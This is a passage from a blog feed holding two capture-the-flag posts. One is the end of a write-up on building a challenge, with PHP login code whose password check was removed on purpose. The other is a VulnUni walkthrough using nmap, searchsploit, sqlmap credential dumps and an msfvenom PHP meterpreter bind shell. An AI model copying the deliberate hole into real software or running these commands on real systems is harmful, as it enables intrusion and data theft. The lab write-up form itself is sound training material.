+&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;num_rows&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;   	&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_id&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;                 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;user_id&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;        &lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_level&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;              &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;level&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;        &lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;timeapp_username&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;        header &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Location: index.php?timeapp_password:&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$timeapp_password&lt;/span&gt;&lt;/span&gt;:passcode:&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$passcode&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_username&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_password&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token keyword&quot;&gt;unset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&#39;timeapp_level&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token variable&quot;&gt;$_SESSION&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token function&quot;&gt;session_destroy&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      header &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Location: login.php?better_luck_next_time:&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$sql&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;      &lt;span class=&quot;token keyword&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the &lt;code&gt;password_verify&lt;/code&gt; function gone, any SQLi that returns a valid user can log into the app as that user.&lt;/p&gt;
+&lt;h3 id=&quot;front-end&quot;&gt;Front-End&lt;/h3&gt;
+&lt;h4&gt;Website Generation&lt;/h4&gt;
+&lt;p&gt;To quickly create a fun front-end for the challenge. I searched through the hugo themes until I found a retro 90s theme from cshoredaniel called &lt;a href=&quot;https://github.com/cshoredaniel/new-oldnew-mashup&quot;&gt;new-oldnew-mashup&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;I mostly followed a fantastic article from Justin Ellingwood on the digital ocean website, &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/how-to-install-and-use-hugo-a-static-site-generator-on-ubuntu-14-04&quot;&gt;“How To Install and Use Hugo, a Static Site Generator, on Ubuntu 14.04”&lt;/a&gt; for setup instructions, generating the site with the following.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;hugo new site ~/Hawkins-Library&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; ~/Hawkins-Library&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I edited the config file to the followig&lt;/p&gt;
+&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;baseurl = &quot;http://public.ip.address&quot;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;languageCode = &quot;en-us&quot;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;title = &quot;Hawkins Public Library&quot;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;theme = &quot;new-oldnew-mashup&quot;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Last, I created new pages for the site, including the books, news, study groups, and home pages.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;hugo new book.md&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When I was finished designing the front end for the challenge. I copied the generated static site into the apache web directory, restarted apache, and the challenge was live.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-17-creating-stranger-servers-ctf/hawkins-lab.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;  
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Overall it was a good learning experience to design, create, and host my own capture the flag challenge. In the future, I will plan on dockerizing this challenge for easier portabiliy and allow others to host the challenge locally instead of on a remote server.&lt;/p&gt;
+</content>
+  </entry>
+  
+  
+  <entry>
+    <title>VulnUni CTF Writeup</title>
+    
+    <link href="https://tbutler.org/posts/2020/06/vulnuni-ctf-writeup/" rel="alternate" type="text/html"/>
+    
+    <updated>2020-06-02T00:00:00-04:00</updated>
+    <id>https://tbutler.org/posts/2020/06/vulnuni-ctf-writeup/</id>
+    <content type="html">&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni-header.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;VulnUni is a CTF challenge hosted on VulnHub and created by @emaragkos. It is a boot2root web application challenge that focuses on SQL injection vulnerabilities and linux privilege escalation. To solve this challenge, I used an unauthenticated blind SQL injection vulnerability, a php bind shell upload, and a linux kernel privilege escalation vulnerability. My workstation setup included VMware fusion and the 2020 release of Kali Linux for VMware which can be found on Offensive Securities VM Image Download Page. One interesting aspect of this challenge is the use of a vulnerable E-learning platform from the Greek University Network GUnet.&lt;/p&gt;
+&lt;h4&gt;Getting Started&lt;/h4&gt;
+&lt;p&gt;First, I launched both the VulnUni and Kali Linux virtual machines on the same local network. To identify the ip addresses of my local attack machine and the target, I ran an arp-scan.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ arp-scan -I eth1 -l&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Interface: eth1, type: EN10MB, MAC: 00:50:56:3e:70:2d, IPv4: &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.131&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Starting arp-scan &lt;span class=&quot;token number&quot;&gt;1.9&lt;/span&gt;.7 with &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; hosts &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;https://github.com/royhills/arp-scan&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.1     00:50:56:c0:00:01       VMware, Inc.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132   00:0c:29:bc:43:d1       VMware, Inc.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.254   00:50:56:e7:01:af       VMware, Inc.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; packets received by filter, &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; packets dropped by kernel&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Ending arp-scan &lt;span class=&quot;token number&quot;&gt;1.9&lt;/span&gt;.7: &lt;span class=&quot;token number&quot;&gt;256&lt;/span&gt; hosts scanned &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1.991&lt;/span&gt; seconds &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;128.58&lt;/span&gt; hosts/sec&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;. &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; responded&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With the ip address handy, I started a couple quick nmap scans to kick off some basic enumeration to learn more about the target. I used one quick nmap scan to get an idea of what was open as well as a longer scan to check all ports.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ nmap -sV -A -O &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Starting Nmap &lt;span class=&quot;token number&quot;&gt;7.80&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; at &lt;span class=&quot;token number&quot;&gt;2020&lt;/span&gt;-05-08 &lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;:45 EDT&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Nmap scan report &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Host is up &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;.00077s latency&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;.&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Not shown: &lt;span class=&quot;token number&quot;&gt;999&lt;/span&gt; closed ports&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;PORT   STATE SERVICE VERSION&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;/tcp &lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;  http    Apache httpd &lt;span class=&quot;token number&quot;&gt;2.2&lt;/span&gt;.22 &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;))&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-server-header: Apache/2.2.22 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;_http-title: VulnUni – We train the &lt;span class=&quot;token function&quot;&gt;top&lt;/span&gt; Information Security Professionals&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;MAC Address: 00:0C:29:BC:43:D1 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Device type: general purpose&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Running: Linux &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;.X&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;.X&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;OS details: Linux &lt;span class=&quot;token number&quot;&gt;3.2&lt;/span&gt; – &lt;span class=&quot;token number&quot;&gt;4.9&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Network Distance: &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; hop&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;TRACEROUTE&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;HOP RTT     ADDRESS&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;0.77&lt;/span&gt; ms &lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.132&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+#### Website Enumeration
+&lt;p&gt;With 80 being the only port open, I launched some basic website enumeration tools including dirbuster and OWASP Zap. Dirbuster was used to brute-force directories and OWASP Zap was used to scan for common vulnerabilities. While these were running in the background, I started some manual website inspection to get familiar with the site.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@kali$ dirbuster
+root@kali$ zaproxy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Zaproxy did not find any major vulnerabilities, but it did have several interesting listings for under directory browsing (&lt;a href=&quot;http://192.168.8.132/vulnuni-eclass/info/&quot;&gt;http://192.168.8.132/vulnuni-eclass/info/&lt;/a&gt;). These directories were not found by the dirbuster brute force search due to the unique nature of the application.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni2.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    An OWASP Zaproxy session showing details of brute forced directories on the target server.
+&lt;/div&gt;
+&lt;p&gt;Navigating to the vulnuni subdirectory, some manual enumeration revealed the application was using version 1.7.2&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni3.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    The platform information page on the vulnuni-eclass web application.
+&lt;/div&gt; 
+&lt;p&gt;A quick search through the exploit-db database with the searchsploit command revealed two public exploits for the application, both created by the CTF author. Using the -m options, I downloaded both exploits into the vs code workspace to inspect the vulnerabilities and prepare to use them against the target.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ searchsploit GUnet &lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;——————————————- —————————————-&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt; Exploit Title                             &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;  Path&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;                                           &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;——————————————- —————————————-&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;GUnet OpenEclass &lt;span class=&quot;token number&quot;&gt;1.7&lt;/span&gt;.3 E-learning platform &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; exploits/php/webapps/48163.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;GUnet OpenEclass E-learning platform &lt;span class=&quot;token number&quot;&gt;1.7&lt;/span&gt;.3 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; exploits/php/webapps/48106.txt&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;——————————————- —————————————-&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Shellcodes: No Result&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ searchsploit -m &lt;span class=&quot;token number&quot;&gt;48163&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ searchsploit -m &lt;span class=&quot;token number&quot;&gt;48106&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;br&gt;
+#### SQL Injection  
+&lt;p&gt;The exploit 48106 revealed a ‘uname’ SQL Injection vulnerability fo the GUnet OpenEclass E-learning platform 1.7.3. To exploit the vulnerability, I first needed to capture a failed log-in request on &lt;a href=&quot;http://192.168.8.132/vulnuni-eclass/&quot;&gt;http://192.168.8.132/vulnuni-eclass/&lt;/a&gt; using burp-suite. I launched BurpSuite and configured my browser to handle http requests through a proxy at port 8080. I submitted a log in request using the username “admin” and the password “test”. BurpSuite captured the request, and I used the “send to repeater option” to save the request for editing.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni4.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    A burpsuite capture showing a POST authentication request being sent to the target web server 
+&lt;/div&gt;   
+&lt;p&gt;At this point, I encountered a small hiccup. Whenever http requests were sent to the vulnuni web application, the hostname was being resolved as VulnUni.local instead of &lt;a href=&quot;http://192.168.8.132/&quot;&gt;http://192.168.8.132&lt;/a&gt;. This caused the http request to fail. To get around this issue, I needed to manually edit the burp-suite login capture to the ip address instead of the resolved hostname. Next, the exploit instructed me to download the intercepted http request as a file (eclasstestlogin) and load into SQL map with the following command.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ sqlmap -r eclasstestlogin –level&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; –risk&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; -v&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni5.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    SQLmap being run in a VSCode terminal 
+&lt;/div&gt;     
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ sqlmap -r eclasstestlogin -v –current-db&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ sqlmap -r eclasstestlogin -v -D eclass –dump&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ sqlmap -r eclasstestlogin -v -D eclass -T user –dump&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni6.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    SQLmap being used to dump database tables
+&lt;/div&gt;     
+&lt;p&gt;Now that I obtained admin credentials from sqlmap, I logged into the application as the administrator. Once again, the http request was being resolved to vulnuni.local. To actually log into the application, I edited the raw request in burp-suite as shown below. After hitting send, I selected the Render” tab on the response, then right clicked and selected to open up in browser.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni7.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&quot;caption&quot;&gt;
+    A burpsuite repeater session using the dumped credentials to log into the application as admin
+&lt;/div&gt;  
+&lt;p&gt;Next, I navigated over to the other exploit identified earlier in the exploit-db. This exploit titled “GUnet OpenEclass 1.7.3 E-learning platform – ‘month’ SQL Injection” enables authenticated admins to upload reverse php shell files. To exploit this vulnerability, I used msfvenom to create a php meterpreter bind shell on port 4448.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;root@kali$ msfvenom -p php/meterpreter/bind_tcp &lt;span class=&quot;token assign-left variable&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;192.168&lt;/span&gt;.8.130 &lt;span class=&quot;token assign-left variable&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4448&lt;/span&gt; R &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; bind-meterpreter.php&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;-&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::PHP from the payload&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;-&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; No arch selected, selecting arch: php from the payload&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;No encoder or badchars specified, outputting raw payload&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;Payload size: &lt;span class=&quot;token number&quot;&gt;1338&lt;/span&gt; bytes&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Before the exploit could be uploaded to the application, it needed to be zipped and compressed. Once zipped, I uploaded it to the vulnuni webserver.&lt;/p&gt;
